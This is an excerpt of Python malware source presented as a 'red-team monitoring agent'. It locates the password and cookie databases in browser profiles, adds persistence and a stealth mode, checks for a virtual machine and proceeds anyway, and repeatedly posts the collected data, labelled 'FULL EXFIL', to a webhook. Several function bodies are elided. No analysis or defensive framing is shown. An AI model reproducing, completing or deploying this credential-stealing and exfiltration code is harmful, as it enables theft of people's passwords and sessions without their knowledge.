# =====================================================
# ULTIMATE RED-TEAM MONITORING AGENT v4.3 - FULL RESTORED
# =====================================================
import os
import sys
import time
    ...
    for browser, base_path in BROWSER_PATHS.items():
        ...
        for profile in profiles[:5]:
            ...
            if os.path.exists(login_db):
                p_data["passwords"] = f"Login Data ({os.path.getsize(login_db)//1024} KB)"
            ...
            if os.path.exists(cookie_db):
                p_data["cookies"] = f"Cookies DB ({os.path.getsize(cookie_db)//1024} KB)"
...
def send_to_webhook(payload, files=None):
    try:
        r = requests.post(WEBHOOK_URL, json=payload, files=files, timeout=15)
        log(f"Sent - status {r.status_code if r else 'fail'}")
    except Exception as e:
        log(f"Webhook error: {e}")

# ================== MAIN LOOP ==================
def main_loop(script_path):
    log("=== AGENT v4.3 STARTED ===")
    add_persistence(script_path)
    stealth_mode()

    vm_detected, vm_name = detect_vm()
    if vm_detected:
        log(f"VM DETECTED: {vm_name} - continuing anyway")
        first_payload = {"embeds": [{"title": "🛡️ AGENT v4.3 - VM DETECTED", "description": f"Hostname: {vm_name}\nContinuing full exfil.", "color": 0xff0000}]}
        send_to_webhook(first_payload)
    ...
    while True:
        try:
            ...
            if ENCRYPT:
                ...
                payload = {"embeds": [{"title": "🛡️ AGENT v4.3 REPORT - FULL EXFIL", "description": encrypted[:1900], "color": 0x9900ff, "footer": {"text": f"EXFIL MODE: {EXFIL_MODE}"}}]}
            else:
                payload = {"content": "**AGENT v4.3 REPORT**\n```json\n" + json.dumps(info, default=str, indent=2)[:1900] + "\n```"}
